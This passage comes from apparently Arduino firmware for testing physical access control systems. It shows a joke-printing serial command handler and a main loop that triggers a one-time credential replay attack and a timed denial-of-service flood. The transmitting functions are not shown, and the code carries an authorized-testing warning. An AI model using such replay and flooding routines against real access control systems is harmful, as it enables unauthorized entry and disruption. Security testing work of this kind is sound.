            command == "sudo" || command == "whoami" || command == "dir" ||
            command == "ping" || command == "ssh" || command == "ifconfig" ||
            command == "tail" || command == "vim" || command == "nano" ||
            command == "cron" || command == "bash") {
      Serial.println(getRandomJoke(command));
    }
    
    // Unknown command
    else {
      Serial.print("\n⚠️ Unknown command: ");
      Serial.println(command);
    }
  }



/*
  ******************************************************************************
  ATTACK CONTROL SYSTEM
  ******************************************************************************
  This module manages the execution and timing of security testing attacks,
  including both replay and denial-of-service (DoS) attack modes.

  ATTACK MODES:
  1. REPLAY ATTACK (triggerReplayAttack()):
     - One-time credential retransmission
     - Uses preconfigured REPLAY_ATTACK_ID
     - Logs action to serial monitor

  2. DENIAL-OF-SERVICE (triggerDosAttack()):
     - Uses DOS_ATTACK_VALUE (0xFFFFFFFF)
     - Optional delay between transmissions

  ******************************************************************************
  SECURITY WARNING:
  !! FOR AUTHORIZED TESTING ONLY !!
  - May disrupt access control systems
  - Could trigger security alerts
  - Always obtain proper authorization
  - Document all testing activities
  ******************************************************************************
*/

  // === Replay Attack (one-time) ===
  triggerReplayAttack();

  // === DoS Attack (continuous) ===
  if (dosMode) {
    triggerDosAttack();

    // If it is time-limited (DOS_DURATION_MS > 0)
    if (DOS_DURATION_MS > 0 && (millis() - dosStartTime > DOS_DURATION_MS)) {
      dosMode = false;
      Serial.println("\nDoS attack timed out");
    }
  }
}










/*

      __...--~~~~~-._   _.-~~~~~--...__
    //               `V'               \\
   //                 |                 \\
  //__...--~~~~~~-._  |  _.-~~~~~~--...__\\
 //__.....----~~~~._\ | /_.~~~~----.....__\\
====================\\|//====================
          The End   `---`

*/





// end of code





